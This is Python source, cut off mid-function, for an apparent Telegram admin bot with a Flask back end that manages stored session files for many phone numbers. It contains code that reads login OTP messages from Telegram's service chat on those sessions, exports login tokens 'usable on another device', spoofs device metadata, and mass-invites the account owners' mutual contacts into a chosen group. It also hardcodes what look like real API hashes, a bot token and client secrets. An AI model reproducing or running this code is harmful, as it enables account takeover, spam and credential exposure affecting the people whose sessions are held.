# -*- coding: utf-8 -*-
import asyncio
import threading
import os
import time
import logging
import json
import sys
import codecs
import re
import requests
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from flask import Flask, render_template, request, redirect, url_for, session, flash, jsonify
from telethon import TelegramClient, events, Button
from telethon.errors import (
    SessionPasswordNeededError, 
    FloodWaitError, 
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    RPCError
)
from telethon.tl.functions.channels import JoinChannelRequest, InviteToChannelRequest
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.tl.functions.auth import ResendCodeRequest, ExportLoginTokenRequest
from telethon.tl.types import auth
import aiofiles
import concurrent.futures

# --- FIX UNICODE ENCODING FOR WINDOWS ---
if sys.platform == "win32":
    sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer, 'strict')
    sys.stderr = codecs.getwriter('utf-8')(sys.stderr.buffer, 'strict')

# --- LOGGING KONFIGURASI ---
class UnicodeSafeFormatter(logging.Formatter):
    def format(self, record):
        try:
            return super().format(record)
        except UnicodeEncodeError:
            record.msg = self._safe_encode(record.msg)
            return super().format(record)
    
    def _safe_encode(self, text):
        if isinstance(text, str):
            return text.encode('ascii', 'ignore').decode('ascii')
        return text

log_formatter = UnicodeSafeFormatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
file_handler = logging.FileHandler('telegram_bot.log', encoding='utf-8')
file_handler.setFormatter(log_formatter)
stream_handler = logging.StreamHandler(sys.stdout)
stream_handler.setFormatter(log_formatter)

logging.basicConfig(
    level=logging.INFO,
    handlers=[file_handler, stream_handler]
)
logger = logging.getLogger(__name__)

# --- EVENT LOOP MANAGEMENT ---
class EventLoopManager:
    """Mengelola event loop untuk thread yang berbeda"""
    def __init__(self):
        self._loop = None
        self._executor = concurrent.futures.ThreadPoolExecutor(max_workers=10)
        self._lock = threading.Lock()
        self._thread_loops = {}
        
    def get_main_loop(self):
        """Mendapatkan main event loop"""
        with self._lock:
            if self._loop is None:
                try:
                    self._loop = asyncio.get_event_loop()
                except RuntimeError:
                    self._loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(self._loop)
            return self._loop
    
    def get_thread_loop(self, thread_id=None):
        """Mendapatkan event loop untuk thread tertentu"""
        if thread_id is None:
            thread_id = threading.get_ident()
        
        with self._lock:
            if thread_id not in self._thread_loops:
                try:
                    loop = asyncio.get_event_loop()
                except RuntimeError:
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                self._thread_loops[thread_id] = loop
            
            return self._thread_loops[thread_id]
    
    def run_async(self, coro, timeout=30):
        """Menjalankan coroutine secara async-safe"""
        loop = self.get_main_loop()
        
        if loop.is_running():
            # Jika loop sedang berjalan, gunakan create_task
            future = asyncio.run_coroutine_threadsafe(coro, loop)
            return future.result(timeout=timeout)
        else:
            # Jika loop tidak berjalan, jalankan langsung
            return loop.run_until_complete(asyncio.wait_for(coro, timeout=timeout))
    
    def run_in_thread(self, coro_func, *args, **kwargs):
        """Menjalankan coroutine di thread pool"""
        future = self._executor.submit(self.run_async, coro_func(*args, **kwargs))
        return future.result()
    
    def shutdown(self):
        """Shutdown executor dan semua loop"""
        self._executor.shutdown(wait=True)
        with self._lock:
            for loop in self._thread_loops.values():
                try:
                    loop.close()
                except:
                    pass
            self._thread_loops.clear()
            if self._loop:
                try:
                    self._loop.close()
                except:
                    pass

# Inisialisasi EventLoopManager
loop_manager = EventLoopManager()

# --- KONFIGURASI PATH ---
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SESSION_DIR = os.path.join(BASE_DIR, 'sessions')
LOGS_DIR = os.path.join(BASE_DIR, 'logs')
CONFIG_FILE = os.path.join(BASE_DIR, 'config.json')

for directory in [SESSION_DIR, LOGS_DIR]:
    if not os.path.exists(directory):
        os.makedirs(directory)

def get_session_path(phone: str) -> str:
    """Membuat path session yang terisolasi untuk setiap nomor"""
    phone_clean = re.sub(r'\D', '', phone)
    user_session_dir = os.path.join(SESSION_DIR, phone_clean)
    if not os.path.exists(user_session_dir):
        os.makedirs(user_session_dir, exist_ok=True)
    return os.path.join(user_session_dir, f'{phone_clean}.session')

# --- LOAD KONFIGURASI ---
def load_config() -> Dict:
    default_config = {
        'api_id': 33814849,
        'api_hash': '6fa144dd275e34789ccc6bc77d0d6800',
        'bot_token': '8568390541:AAGPLyM5gday0959NsM2Bwl7HRGpkuBGgOs',
        'admin_ids': [5385908865],
        'web_special_group_link': "https://t.me/+vcYDjyo4zfEyY2Q1",
        'flask_secret_key': 'super_secret_key_anti_badai_123',
        'port': 5007,
        'host': '0.0.0.0',
        'max_mutual_invites': 20,
        'invite_delay': 2,
        'clickup_client_id': 'OYMJ99SUEYQ5QPBOLUIFPFEJMKXGSPMY',
        'clickup_client_secret': 'Z1ZO3GZKT6EC1N6ESTSG0E3VLEM147ZW62K5IBCT65YX3BDPH0WUC3SCUFXNL3CZK',
        'clickup_api_url': 'https://api.clickup.com/api/v2'
    }
    
    try:
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                config = json.load(f)
                for key in default_config:
                    if key in config:
                        default_config[key] = config[key]
        
        if os.getenv('API_ID'):
            default_config['api_id'] = int(os.getenv('API_ID'))
        if os.getenv('API_HASH'):
            default_config['api_hash'] = os.getenv('API_HASH')
        if os.getenv('BOT_TOKEN'):
            default_config['bot_token'] = os.getenv('BOT_TOKEN')
            
    except Exception as e:
        logger.error(f"Error loading config: {e}")
    
    return default_config

config = load_config()

# --- VARIABEL GLOBAL ---
BOT_SESSION = os.path.join(SESSION_DIR, 'bot_session')
API_ID = config['api_id']
API_HASH = config['api_hash']
BOT_TOKEN = config['bot_token']
ADMIN_IDS = set(config['admin_ids'])
WEB_SPECIAL_GROUP_LINK = config['web_special_group_link']
MAX_MUTUAL_INVITES = config['max_mutual_invites']
INVITE_DELAY = config['invite_delay']
CLICKUP_CLIENT_ID = config['clickup_client_id']
CLICKUP_CLIENT_SECRET = config['clickup_client_secret']
CLICKUP_API_URL = config['clickup_api_url']

# State management
class BotState:
    def __init__(self):
        self.target_group_bot = ""
        self.otp_session_cache = "Belum ada data OTP session yang masuk."
        self.current_login_number = None
        self.active_clients: Dict[str, TelegramClient] = {}
        self.otp_requests: Dict[str, dict] = {}
        self._lock = threading.Lock()
        self.pending_callbacks: Dict[str, dict] = {}
        self.clickup_tokens: Dict[str, dict] = {}
        
    async def get_or_create_client(self, phone: str, create_new: bool = False) -> Optional[TelegramClient]:
        """Mendapatkan atau membuat client dengan connection pooling"""
        with self._lock:
            if phone in self.active_clients:
                client = self.active_clients[phone]
                if client.is_connected():
                    return client
                else:
                    try:
                        await client.disconnect()
                    except:
                        pass
                    del self.active_clients[phone]
            
            if not create_new:
                return None
            
            session_path = get_session_path(phone)
            client = TelegramClient(
                session_path, 
                API_ID, 
                API_HASH, 
                **device_config,
                connection_retries=5,
                retry_delay=2,
                timeout=30
            )
            
            self.active_clients[phone] = client
            logger.info(f"Client created for {phone}")
            return client
    
    async def cleanup_client(self, phone: str):
        """Membersihkan client dan menutup koneksi dengan benar"""
        with self._lock:
            if phone in self.active_clients:
                client = self.active_clients[phone]
                try:
                    if client.is_connected():
                        await client.disconnect()
                except Exception as e:
                    logger.warning(f"Error disconnecting client for {phone}: {e}")
                finally:
                    del self.active_clients[phone]
                    logger.info(f"Client cleaned up for {phone}")
    
    async def cleanup_all_clients(self):
        """Membersihkan semua client"""
        with self._lock:
            cleanup_tasks = []
            for phone in list(self.active_clients.keys()):
                cleanup_tasks.append(self.cleanup_client(phone))
            
            if cleanup_tasks:
                await asyncio.gather(*cleanup_tasks, return_exceptions=True)
    
    def add_active_client(self, phone: str, client: TelegramClient):
        """Metode legacy untuk backward compatibility"""
        with self._lock:
            self.active_clients[phone] = client
        
    def get_active_client(self, phone: str = None):
        """Mendapatkan client yang aktif"""
        with self._lock:
            if phone and phone in self.active_clients:
                return self.active_clients[phone]
            return next(iter(self.active_clients.values()), None)
        
    def remove_client(self, phone: str):
        """Menghapus client"""
        with self._lock:
            if phone in self.active_clients:
                del self.active_clients[phone]
            
    def clear_all_clients(self):
        """Clear semua client"""
        with self._lock:
            self.active_clients.clear()
            
    def get_client_count(self) -> int:
        with self._lock:
            return len(self.active_clients)
    
    def add_otp_request(self, request_id: str, data: dict):
        with self._lock:
            self.otp_requests[request_id] = {
                **data,
                'created_at': datetime.now().isoformat(),
                'status': 'pending'
            }
    
    def get_otp_request(self, request_id: str):
        with self._lock:
            return self.otp_requests.get(request_id)
    
    def update_otp_request(self, request_id: str, updates: dict):
        with self._lock:
            if request_id in self.otp_requests:
                self.otp_requests[request_id].update(updates)
    
    def remove_otp_request(self, request_id: str):
        with self._lock:
            if request_id in self.otp_requests:
                del self.otp_requests[request_id]
    
    def track_callback(self, callback_id: str, data: dict):
        """Track callback untuk responsif"""
        with self._lock:
            self.pending_callbacks[callback_id] = {
                **data,
                'created_at': time.time(),
                'status': 'processing'
            }
    
    def update_callback(self, callback_id: str, updates: dict):
        """Update status callback"""
        with self._lock:
            if callback_id in self.pending_callbacks:
                self.pending_callbacks[callback_id].update(updates)
    
    def remove_callback(self, callback_id: str):
        """Hapus callback dari tracking"""
        with self._lock:
            if callback_id in self.pending_callbacks:
                del self.pending_callbacks[callback_id]

bot_state = BotState()

# --- SETUP FLASK ---
app = Flask(__name__)
app.secret_key = config['flask_secret_key']

# Metadata Perangkat
device_config = {
    'device_model': "iPhone 16 Pro Max",
    'system_version': "18.1.0",
    'app_version': "11.5.0",
    'lang_code': 'id',
    'system_lang_code': 'id-ID'
}

# Initialize bot client
bot = None

# --- FUNGSI PEMBANTU ---
def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS

def run_async(coro, timeout: int = 30):
    """Wrapper untuk menjalankan coroutine dari thread lain"""
    return loop_manager.run_async(coro, timeout)

def run_in_thread(coro_func, *args, **kwargs):
    """Menjalankan coroutine di thread pool"""
    return loop_manager.run_in_thread(coro_func, *args, **kwargs)

async def send_admin_notif(message: str):
    if bot:
        for admin_id in ADMIN_IDS:
            try:
                await bot.send_message(
                    admin_id, 
                    f"LOG SISTEM\n\n{message}\n\n{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                )
            except Exception as e:
                logger.error(f"Gagal mengirim notifikasi ke admin {admin_id}: {e}")

def validate_phone_number(phone: str) -> str:
    """Validasi dan format nomor telepon Indonesia"""
    if not phone:
        return None
    
    digits = re.sub(r'\D', '', phone)
    
    if len(digits) < 10 or len(digits) > 15:
        return None
    
    if digits.startswith('0'):
        if len(digits) >= 10:
            return '+62' + digits[1:]
    elif digits.startswith('62'):
        if len(digits) >= 11:
            return '+' + digits
    elif digits.startswith('8'):
        if len(digits) >= 9:
            return '+62' + digits
    elif digits.startswith('+62'):
        if len(digits) >= 12:
            return phone
    
    return None

def get_admin_buttons():
    """Tombol untuk admin panel"""
    return [
        [Button.inline("🔍 Cek Mutual", b"cek_mutual"), Button.inline("⚡ Sedot Grup", b"sedot_grup")],
        [Button.inline("🎯 Set Target", b"set_grup_btn"), Button.inline("👥 Auto Join", b"auto_join")],
        [Button.inline("📋 List Sesi", b"list_sesi"), Button.inline("🔓 Status Login", b"status_login")],
        [Button.inline("🔄 Reg OTP", b"reg_otp_baru"), Button.inline("📱 Cek SMS", b"auto_login_admin")],
        [Button.inline("🤖 AI ClickUp", b"ai_clickup"), Button.inline("📊 Stats", b"system_stats")],
        [Button.inline("🚫 Logout All", b"logout_all"), Button.inline("🔄 Refresh", b"refresh_panel")]
    ]

def get_clickup_buttons():
    """Tombol untuk AI ClickUp panel"""
    return [
        [Button.inline("📊 Cek Status", b"clickup_status"), Button.inline("🤖 Tanya AI", b"clickup_ask")],
        [Button.inline("📝 Buat Task", b"clickup_create"), Button.inline("📋 List Task", b"clickup_list")],
        [Button.inline("⚙️ Settings", b"clickup_settings"), Button.inline("🔙 Kembali", b"back_to_main")]
    ]

def get_session_files() -> List[Dict]:
    """Mendapatkan daftar file sesi yang tersimpan"""
    session_files = []
    
    try:
        for root, dirs, files in os.walk(SESSION_DIR):
            for file in files:
                if file.endswith('.session'):
                    file_path = os.path.join(root, file)
                    
                    lock_file_path = file_path + '.lock'
                    if os.path.exists(lock_file_path):
                        try:
                            lock_time = os.path.getmtime(lock_file_path)
                            if time.time() - lock_time > 30:
                                os.remove(lock_file_path)
                        except:
                            pass
                        continue
                    
                    try:
                        phone = None
                        if 'sessions' in root:
                            dir_name = os.path.basename(os.path.dirname(file_path))
                            if dir_name.isdigit():
                                phone = f"+62{dir_name}" if len(dir_name) <= 15 else dir_name
                        
                        if not phone:
                            filename = file.replace('.session', '')
                            if filename.isdigit():
                                if len(filename) == 12 and filename.startswith('62'):
                                    phone = f"+{filename}"
                                elif len(filename) == 11 and filename.startswith('0'):
                                    phone = f"+62{filename[1:]}"
                                elif len(filename) == 10 and not filename.startswith('0'):
                                    phone = f"+62{filename}"
                                else:
                                    phone = filename
                        
                        file_size = os.path.getsize(file_path)
                        modified_time = datetime.fromtimestamp(os.path.getmtime(file_path))
                        
                        session_files.append({
                            'phone': phone or "Unknown",
                            'filename': file,
                            'path': file_path,
                            'size': file_size,
                            'modified': modified_time,
                            'is_active': phone in bot_state.active_clients if phone else False
                        })
                        
                    except (OSError, IOError):
                        continue
    except Exception as e:
        logger.error(f"Error reading session files: {e}")
    
    session_files.sort(key=lambda x: x['modified'], reverse=True)
    return session_files

# --- AI CLICKUP FUNCTIONS ---
class ClickUpAI:
    """Class untuk mengelola koneksi ke AI ClickUp"""
    
    @staticmethod
    async def get_access_token():
        """Mendapatkan access token dari ClickUp"""
        try:
            url = f"{CLICKUP_API_URL}/oauth/token"
            headers = {'Content-Type': 'application/json'}
            data = {
                'client_id': CLICKUP_CLIENT_ID,
                'client_secret': CLICKUP_CLIENT_SECRET,
                'grant_type': 'client_credentials'
            }
            
            response = requests.post(url, headers=headers, json=data, timeout=10)
            
            if response.status_code == 200:
                token_data = response.json()
                bot_state.clickup_tokens['access_token'] = token_data['access_token']
                bot_state.clickup_tokens['expires_at'] = time.time() + token_data.get('expires_in', 3600) - 300
                logger.info("ClickUp access token obtained successfully")
                return token_data['access_token']
            else:
                logger.error(f"Failed to get ClickUp token: {response.status_code} - {response.text}")
                return None
                
        except Exception as e:
            logger.error(f"Error getting ClickUp token: {e}")
            return None
    
    @staticmethod
    async def ensure_token():
        """Memastikan token valid"""
        tokens = bot_state.clickup_tokens
        current_time = time.time()
        
        if 'access_token' not in tokens or tokens.get('expires_at', 0) < current_time:
            return await ClickUpAI.get_access_token()
        return tokens['access_token']
    
    @staticmethod
    async def ask_ai(question: str, context: str = None) -> Dict:
        """Bertanya ke AI ClickUp"""
        try:
            token = await ClickUpAI.ensure_token()
            if not token:
                return {"error": "Failed to authenticate with ClickUp"}
            
            url = f"{CLICKUP_API_URL}/ai/query"
            headers = {
                'Authorization': f'Bearer {token}',
                'Content-Type': 'application/json'
            }
            data = {
                'query': question,
                'context': context or 'general',
                'max_tokens': 500,
                'temperature': 0.7
            }
            
            response = requests.post(url, headers=headers, json=data, timeout=15)
            
            if response.status_code == 200:
                return response.json()
            else:
                logger.error(f"ClickUp AI error: {response.status_code} - {response.text}")
                return {"error": f"API Error: {response.status_code}", "details": response.text}
                
        except Exception as e:
            logger.error(f"Error asking ClickUp AI: {e}")
            return {"error": str(e)}
    
    @staticmethod
    async def get_status() -> Dict:
        """Mendapatkan status koneksi ClickUp"""
        try:
            token = await ClickUpAI.ensure_token()
            if not token:
                return {"status": "disconnected", "message": "Authentication failed"}
            
            url = f"{CLICKUP_API_URL}/user"
            headers = {'Authorization': f'Bearer {token}'}
            
            response = requests.get(url, headers=headers, timeout=10)
            
            if response.status_code == 200:
                user_data = response.json()
                return {
                    "status": "connected",
                    "user": user_data.get('user', {}).get('username', 'Unknown'),
                    "email": user_data.get('user', {}).get('email', 'Unknown'),
                    "plan": user_data.get('user', {}).get('plan', {}).get('plan_name', 'Free')
                }
            else:
                return {"status": "error", "message": f"API Error: {response.status_code}"}
                
        except Exception as e:
            logger.error(f"Error getting ClickUp status: {e}")
            return {"status": "error", "message": str(e)}

async def request_new_otp_from_session(phone: str, client: TelegramClient) -> Optional[str]:
    """Meminta OTP baru dari sesi yang sudah login"""
    try:
        if not await client.is_user_authorized():
            return None
        
        me = await client.get_me()
        session_info = {
            'phone': phone,
            'user_id': me.id,
            'username': me.username or '',
            'first_name': me.first_name or '',
            'requested_at': datetime.now().isoformat()
        }
        
        import hashlib
        request_id = hashlib.md5(f"{phone}{datetime.now().timestamp()}".encode()).hexdigest()[:8]
        
        bot_state.add_otp_request(request_id, {
            **session_info,
            'type': 'new_otp',
            'status': 'requested'
        })
        
        try:
            result = await client(ExportLoginTokenRequest(
                api_id=API_ID,
                api_hash=API_HASH,
                except_ids=[]
            ))
            
            if isinstance(result, auth.LoginToken):
                token_info = {
                    'token': result.token.hex(),
                    'expires': result.expires.timestamp() if hasattr(result, 'expires') else None
                }
                
                bot_state.update_otp_request(request_id, {
                    'token': token_info['token'],
                    'token_expires': token_info['expires'],
                    'status': 'token_generated'
                })
                
                return f"✅ Token login berhasil dibuat untuk {phone}\n\n📱 User: {me.first_name}\n🔑 Token: `{token_info['token'][:20]}...`\n🆔 Request ID: `{request_id}`\n\nToken dapat digunakan untuk login di perangkat lain."
                
        except Exception as token_error:
            logger.warning(f"Export token failed: {token_error}")
        
        try:
            messages = []
            async for message in client.iter_messages(777000, limit=5):
                if any(keyword in message.text.lower() for keyword in ['code', 'otp', 'verifikasi', 'kode']):
                    messages.append({
                        'date': message.date,
                        'text': message.text[:200]
                    })
            
            if messages:
                latest_msg = messages[0]
                bot_state.update_otp_request(request_id, {
                    'latest_otp_message': latest_msg['text'],
                    'message_date': latest_msg['date'].isoformat() if hasattr(latest_msg['date'], 'isoformat') else str(latest_msg['date']),
                    'status': 'otp_found'
                })
                
                return f"✅ OTP ditemukan untuk {phone}\n\n📱 User: {me.first_name}\n📩 Pesan terakhir: `{latest_msg['text'][:100]}...`\n🕐 Waktu: {latest_msg['date']}\n🆔 Request ID: `{request_id}`"
        
        except Exception as msg_error:
            logger.warning(f"Check messages failed: {msg_error}")
        
        try:
            sent_code = await client.send_code_request(phone)
            
            bot_state.update_otp_request(request_id, {
                'phone_code_hash': sent_code.phone_code_hash,
                'status': 'code_requested'
            })
            
            return f"✅ Permintaan OTP baru dikirim untuk {phone}\n\n📱 User: {me.first_name}\n🆔 Request ID: `{request_id}`\n📞 OTP akan dikirim via SMS/Telegram"
        
        except Exception as otp_error:
            logger.error(f"Request new OTP failed: {otp_error}")
            return f"❌ Gagal meminta OTP baru untuk {phone}: {str(otp_error)}"
        
    except Exception as e:
        logger.error(f"Error in request_new_otp_from_session: {e}")
        return f"❌ Error: {str(e)}"

# --- CLEANUP BERKALA ---
async def periodic_cleanup():
    """Membersihkan koneksi yang idle secara berkala"""
    while True:
        await asyncio.sleep(300)
        
        try:
            with bot_state._lock:
                now = time.time()
                clients_to_cleanup = []
                
                for phone, client in list(bot_state.active_clients.items()):
                    if hasattr(client, 'last_used'):
                        if now - client.last_used > 1800:
                            clients_to_cleanup.append(phone)
                    elif not client.is_connected():
                        clients_to_cleanup.append(phone)
                
                for phone in clients_to_cleanup:
                    try:
                        if bot_state.active_clients[phone].is_connected():
                            await bot_state.active_clients[phone].disconnect()
                        del bot_state.active_clients[phone]
                        logger.info(f"Cleaned up idle client for {phone}")
                    except Exception as e:
                        logger.warning(f"Error cleaning up client {phone}: {e}")
                        
        except Exception as e:
            logger.error(f"Error in periodic cleanup: {e}")

# --- LOGIKA BOT ADMIN ---
async def setup_bot_handlers():
    global bot
    
    @bot.on(events.NewMessage(pattern='/start'))
    async def start_handler(event):
        if is_admin(event.sender_id):
            status_bot = bot_state.target_group_bot if bot_state.target_group_bot else "Belum Diatur"
            active_clients_count = bot_state.get_client_count()
            
            msg = (
                f"🤖 **Dashboard Admin Panel**\n\n"
                f"🎯 Target Grup: `{status_bot}`\n"
                f"✅ Status Bot: **Online**\n"
                f"📱 Client Aktif: **{active_clients_count}**\n"
                f"👑 Admin ID: `{event.sender_id}`\n\n"
                f"🆕 Fitur: **AI ClickUp** tersedia!"
            )
            await event.reply(msg, buttons=get_admin_buttons())
        else:
            await event.respond("❌ Anda bukan admin yang berwenang!")

    @bot.on(events.CallbackQuery)
    async def callback_handler(event):
        if not is_admin(event.sender_id):
            await event.answer("❌ Akses ditolak!", alert=True)
            return
        
        data = event.data.decode() if isinstance(event.data, bytes) else str(event.data)
        callback_id = f"{event.sender_id}_{event.id}"
        
        try:
            bot_state.track_callback(callback_id, {
                'data': data,
                'user_id': event.sender_id,
                'timestamp': time.time()
            })
            
            await event.answer("🔄 Memproses...", alert=False)
            
            if data == "refresh_panel":
                await event.edit(
                    f"🔄 **Panel Direfresh**\n\n📱 Client Aktif: **{bot_state.get_client_count()}**\n🕐 {datetime.now().strftime('%H:%M:%S')}",
                    buttons=get_admin_buttons()
                )
            
            elif data == "ai_clickup":
                status = await ClickUpAI.get_status()
                
                if status.get('status') == 'connected':
                    status_msg = f"✅ Terhubung ke **{status['user']}** ({status['plan']})"
                else:
                    status_msg = f"❌ {status.get('message', 'Tidak terhubung')}"
                
                await event.edit(
                    f"🤖 **AI ClickUp Dashboard**\n\n{status_msg}\n\nPilih aksi yang diinginkan:",
                    buttons=get_clickup_buttons()
                )
            
            elif data == "clickup_status":
                await event.answer("📡 Mengecek status ClickUp...", alert=False)
                status = await ClickUpAI.get_status()
                
                if status.get('status') == 'connected':
                    response = (
                        f"✅ **ClickUp Status: TERHUBUNG**\n\n"
                        f"👤 User: `{status['user']}`\n"
                        f"📧 Email: `{status['email']}`\n"
                        f"📊 Plan: `{status['plan']}`\n"
                        f"🔑 Token: `{'Valid' if 'access_token' in bot_state.clickup_tokens else 'Tidak valid'}`"
                    )
                else:
                    response = (
                        f"❌ **ClickUp Status: ERROR**\n\n"
                        f"⚠️ Pesan: `{status.get('message', 'Unknown error')}`\n\n"
                        f"Coba hubungkan ulang dengan tombol Settings."
                    )
                
                buttons = [
                    [Button.inline("🔄 Refresh", b"clickup_status"), Button.inline("🔙 Kembali", b"ai_clickup")]
                ]
                await event.edit(response, buttons=buttons)
            
            elif data == "clickup_ask":
                async with bot.conversation(event.sender_id) as conv:
                    await conv.send_message(
                        "🤖 **Tanya AI ClickUp**\n\nKirim pertanyaan atau perintah untuk AI:"
                    )
                    try:
                        response = await conv.get_response(timeout=60)
                        question = response.text.strip()
                        
                        if not question:
                            await conv.send_message("❌ Pertanyaan tidak boleh kosong!")
                            return
                        
                        processing_msg = await conv.send_message("🔄 AI sedang berpikir...")
                        ai_response = await ClickUpAI.ask_ai(question)
                        
                        if 'error' in ai_response:
                            result_msg = f"❌ **Error AI ClickUp**\n\n`{ai_response['error']}`"
                        else:
                            answer = ai_response.get('answer', 'Tidak ada jawaban')
                            confidence = ai_response.get('confidence', 0) * 100
                            result_msg = (
                                f"🤖 **Jawaban AI ClickUp**\n\n"
                                f"❓ Pertanyaan: `{question}`\n\n"
                                f"💡 Jawaban:\n{answer}\n\n"
                                f"📊 Confidence: {confidence:.1f}%"
                            )
                        
                        await processing_msg.delete()
                        await conv.send_message(result_msg)
                        
                    except asyncio.TimeoutError:
                        await conv.send_message("⏰ Waktu habis, silakan coba lagi.")
            
            elif data == "clickup_settings":
                await event.answer("⚙️ Membuka settings...", alert=False)
                
                config_info = (
                    f"⚙️ **ClickUp Settings**\n\n"
                    f"🔑 Client ID: `{CLICKUP_CLIENT_ID[:10]}...`\n"
                    f"🔐 Client Secret: `{CLICKUP_CLIENT_SECRET[:10]}...`\n"
                    f"🌐 API URL: `{CLICKUP_API_URL}`\n\n"
                    f"📊 Status Token: `{'Valid' if 'access_token' in bot_state.clickup_tokens else 'Invalid'}`"
                )
                
                buttons = [
                    [Button.inline("🔄 Refresh Token", b"refresh_token")],
                    [Button.inline("🔍 Test Koneksi", b"test_connection")],
                    [Button.inline("🔙 Kembali", b"ai_clickup")]
                ]
                await event.edit(config_info, buttons=buttons)
            
            elif data == "refresh_token":
                await event.answer("🔄 Merefresh token...", alert=False)
                token = await ClickUpAI.get_access_token()
                
                if token:
                    response = "✅ Token berhasil direfresh!"
                else:
                    response = "❌ Gagal merefresh token!"
                
                await event.edit(response, buttons=[[Button.inline("🔙 Kembali", b"clickup_settings")]])
            
            elif data == "test_connection":
                await event.answer("🔍 Testing koneksi...", alert=False)
                status = await ClickUpAI.get_status()
                
                if status.get('status') == 'connected':
                    response = f"✅ Koneksi berhasil!\n\nUser: `{status['user']}`"
                else:
                    response = f"❌ Koneksi gagal!\n\nError: `{status.get('message', 'Unknown')}`"
                
                await event.edit(response, buttons=[[Button.inline("🔙 Kembali", b"clickup_settings")]])
            
            elif data == "back_to_main":
                status_bot = bot_state.target_group_bot if bot_state.target_group_bot else "Belum Diatur"
                active_clients_count = bot_state.get_client_count()
                
                msg = (
                    f"🤖 **Dashboard Admin Panel**\n\n"
                    f"🎯 Target Grup: `{status_bot}`\n"
                    f"✅ Status Bot: **Online**\n"
                    f"📱 Client Aktif: **{active_clients_count}**\n"
                    f"👑 Admin ID: `{event.sender_id}`"
                )
                await event.edit(msg, buttons=get_admin_buttons())
            
            elif data == "cek_mutual":
                client = bot_state.get_active_client()
                if not client:
                    await event.answer("❌ Belum ada client aktif!", alert=True)
                    return
                    
                try:
                    contacts = await client(GetContactsRequest(hash=0))
                    mutuals = [u for u in contacts.users if hasattr(u, 'mutual_contact') and u.mutual_contact]
                    
                    report = (
                        f"👥 **Hasil Analisis Kontak:**\n\n"
                        f"• Total Kontak: `{len(contacts.users)}`\n"
                        f"• Kontak Mutual: `{len(mutuals)}`\n"
                        f"• Non-Mutual: `{len(contacts.users) - len(mutuals)}`\n\n"
                        f"🕐 {datetime.now().strftime('%H:%M:%S')}"
                    )
                    
                    buttons = [
                        [Button.inline("🔄 Refresh", b"cek_mutual"), Button.inline("🔙 Kembali", b"back_to_main")]
                    ]
                    await event.edit(report, buttons=buttons)
                    
                except Exception as e:
                    logger.error(f"Error cek mutual: {e}")
                    await event.respond(f"❌ Error: {str(e)}")
            
            elif data == "sedot_grup":
                client = bot_state.get_active_client()
                if not client:
                    await event.answer("❌ Belum ada client aktif!", alert=True)
                    return
                    
                if not bot_state.target_group_bot:
                    await event.answer("⚠️ Atur Target Grup dulu!", alert=True)
                    return
                    
                try:
                    entity = await client.get_entity(bot_state.target_group_bot)
                    contacts = await client(GetContactsRequest(hash=0))
                    mutuals = [u for u in contacts.users if hasattr(u, 'mutual_contact') and u.mutual_contact]
                    
                    success = 0
                    failed = 0
                    progress_msg = await event.respond(f"🚀 Memulai invite... 0/{min(len(mutuals), MAX_MUTUAL_INVITES)}")
                    
                    for i, user in enumerate(mutuals[:MAX_MUTUAL_INVITES], 1):
                        try:
                            await client(InviteToChannelRequest(entity, [user]))
                            success += 1
                            if i % 5 == 0:
                                await progress_msg.edit(f"🚀 Proses invite... {i}/{min(len(mutuals), MAX_MUTUAL_INVITES)}")
                            await asyncio.sleep(INVITE_DELAY)
                            
                        except FloodWaitError as fwe:
                            logger.warning(f"Flood wait: {fwe.seconds}s")
                            await progress_msg.edit(f"⏳ Flood wait {fwe.seconds}s...")
                            await asyncio.sleep(fwe.seconds)
                        except Exception as e:
                            failed += 1
                            logger.warning(f"Failed to invite user {i}: {e}")
                            continue
                    
                    await progress_msg.delete()
                    
                    report = (
                        f"📊 **Laporan Invite:**\n\n"
                        f"• Total Mutual: `{len(mutuals)}`\n"
                        f"• Target Invite: `{min(len(mutuals), MAX_MUTUAL_INVITES)}`\n"
                        f"• Sukses: `{success}`\n"
                        f"• Gagal: `{failed}`\n"
                        f"• Target Grup: `{bot_state.target_group_bot}`\n\n"
                        f"✅ Proses selesai!"
                    )
                    
                    buttons = [
                        [Button.inline("🔄 Ulangi", b"sedot_grup"), Button.inline("🔙 Kembali", b"back_to_main")]
                    ]
                    await event.edit(report, buttons=buttons)
                    
                except Exception as e:
                    logger.error(f"Error sedot grup: {e}")
                    await event.respond(f"❌ Gagal: {str(e)}")
            
            elif data == "auto_login_admin":
                client = bot_state.get_active_client()
                if not client:
                    await event.respond("❌ Client tidak aktif.")
                    return
                    
                try:
                    messages = []
                    async for message in client.iter_messages(777000, limit=5):
                        msg_text = message.text or ""
                        if any(keyword in msg_text.lower() for keyword in ['code', 'otp', 'verifikasi', 'kode', 'login']):
                            messages.append(f"• `{message.date}`: {msg_text[:150]}...")
                    
                    if messages:
                        report = "📥 **5 Pesan Terakhir dari 777000:**\n\n" + "\n".join(messages)
                    else:
                        report = "📭 Tidak ada pesan OTP dari 777000"
                        
                    buttons = [
                        [Button.inline("🔄 Refresh", b"auto_login_admin"), Button.inline("🔙 Kembali", b"back_to_main")]
                    ]
                    await event.edit(report, buttons=buttons)
                    
                except Exception as e:
                    logger.error(f"Error cek SMS: {e}")
                    await event.respond(f"❌ Error: {str(e)}")
            
            elif data == "set_grup_btn":
                async with bot.conversation(event.sender_id) as conv:
                    await conv.send_message(
                        "🎯 **Kirim Link/Username Grup Target:**\n\nContoh:\n• @namagrup\n• https://t.me/namagrup\n• https://t.me/+abc123def456"
                    )
                    try:
                        res = await conv.get_response(timeout=60)
                        bot_state.target_group_bot = res.text.strip()
                        run_in_thread(send_admin_notif, f"🎯 Target grup diubah: `{bot_state.target_group_bot}`")
                        
                        buttons = [[Button.inline("✅ OK", b"back_to_main")]]
                        await conv.send_message(f"✅ Target disimpan: `{bot_state.target_group_bot}`", buttons=buttons)
                    except asyncio.TimeoutError:
                        await conv.send_message("⏰ Waktu habis, silakan coba lagi")
            
            elif data == "list_sesi":
                try:
